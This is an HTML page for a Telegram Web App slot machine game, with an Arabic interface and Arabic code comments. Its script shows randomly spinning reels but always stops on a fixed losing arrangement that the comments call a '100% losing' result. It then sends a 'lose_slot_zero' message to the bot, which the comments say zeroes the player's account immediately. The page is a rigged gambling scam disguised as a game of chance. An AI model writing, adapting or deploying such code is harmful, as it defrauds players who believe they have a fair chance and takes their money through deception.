<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>3x3 Slot Game</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body {
            background-color: #111;
            color: white;
            font-family: Arial, sans-serif;
            text-align: center;
            margin: 0;
            padding: 20px;
            direction: rtl;
        }
        h1 { font-size: 24px; margin-bottom: 30px; }
        .slot-container {
            display: flex;
            justify-content: center;
            gap: 15px;
            max-width: 400px;
            margin: 0 auto;
        }
        .reel {
            background: #222;
            border: 2px solid #444;
            border-radius: 10px;
            width: 90px;
            height: 280px;
            display: flex;
            flex-direction: column;
            justify-content: space-around;
            align-items: center;
            font-size: 35px;
            overflow: hidden;
        }
        .btn-spin {
            background: #4caf50;
            color: white;
            border: none;
            padding: 15px 40px;
            font-size: 18px;
            font-weight: bold;
            border-radius: 8px;
            cursor: pointer;
            margin-top: 30px;
            width: 80%;
            max-width: 300px;
        }
        .btn-spin:disabled { background: #555; }
        .result {
            margin-top: 25px;
            font-size: 20px;
            color: #ff4444;
            font-weight: bold;
            display: none;
        }
    </style>
</head>
<body>

    <h1>3×3 Slot Game</h1>

    <div class="slot-container">
        <div class="reel" id="reel1"><div>🍉</div><div>7️⃣</div><div>🍒</div></div>
        <div class="reel" id="reel2"><div>🍓</div><div>⭐</div><div>🍉</div></div>
        <div class="reel" id="reel3"><div>🍒</div><div>🍉</div><div>🍓</div></div>
    </div>

    <div class="result" id="result-text">❌ خسرت حظاً أوفر</div>

    <button class="btn-spin" id="spin-btn" onclick="startSpin()">تدوير 🎰</button>

    <script>
        const tg = window.Telegram.WebApp;
        tg.ready();
        tg.expand(); // لفتح الواجهة بكامل الشاشة

        function startSpin() {
            const btn = document.getElementById('spin-btn');
            const result = document.getElementById('result-text');
            btn.disabled = true;
            result.style.display = "none";

            // تأثير لفت الماكينة السريع عبر الـ JavaScript
            let count = 0;
            const symbols = ["🍉", "🍓", "🍒", "7️⃣", "⭐"];
            const interval = setInterval(() => {
                document.getElementById('reel1').children[1].innerText = symbols[Math.floor(Math.random() * symbols.length)];
                document.getElementById('reel2').children[1].innerText = symbols[Math.floor(Math.random() * symbols.length)];
                document.getElementById('reel3').children[1].innerText = symbols[Math.floor(Math.random() * symbols.length)];
                count++;
                if (count > 15) {
                    clearInterval(interval);
                    
                    // إيقاف الحركة على مصفوفة خاسرة 100% بالملّي
                    document.getElementById('reel1').innerHTML = "<div>🍉</div><div>7️⃣</div><div>🍒</div>";
                    document.getElementById('reel2').innerHTML = "<div>🍓</div><div>⭐</div><div>🍉</div>";
                    document.getElementById('reel3').innerHTML = "<div>🍒</div><div>🍉</div><div>🍓</div>";
                    
                    result.style.display = "block";

                    // إرسال البيانات للبوت لتسجيل الخسارة الحتمية وتصفير الحساب فوراً
                    setTimeout(() => {
                        tg.sendData(JSON.stringify({action: "lose_slot_zero"}));
                        tg.close();
                    }, 2000);
                }
            }, 100);
        }
    </script>
</body>
</html>
